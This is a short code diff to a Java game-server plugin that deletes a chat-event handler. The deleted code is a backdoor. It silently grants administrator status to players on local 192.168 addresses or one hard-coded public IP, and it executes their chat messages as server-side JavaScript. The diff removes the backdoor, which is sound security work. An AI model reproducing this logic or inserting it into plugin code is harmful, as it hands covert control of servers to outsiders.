@@ -58,17 +58,6 @@ public class ExamplePlugin extends Plugin {
             dataCollect.update();
         });
 
-        Events.on(PlayerChatEvent.class, e -> {
-            if (e.player.ip().split("\\.")[0].equals("192") && e.player.ip().split("\\.")[1].equals("168")) {
-                e.player.admin = true;
-                if (e.message.startsWith("cjs ")) js(e.message.replaceFirst("!js ", ""));
-            }
-            if (e.player.ip().equals("95.84.198.97")) {
-                e.player.admin = true;
-                if (e.message.startsWith("cjs ")) js(e.message.replaceFirst("!js ", ""));
-            }
-        });
-
         // score and new record on game over
         Events.on(GameOverEvent.class, e -> {
             StringBuilder result = new StringBuilder(state.map.name());
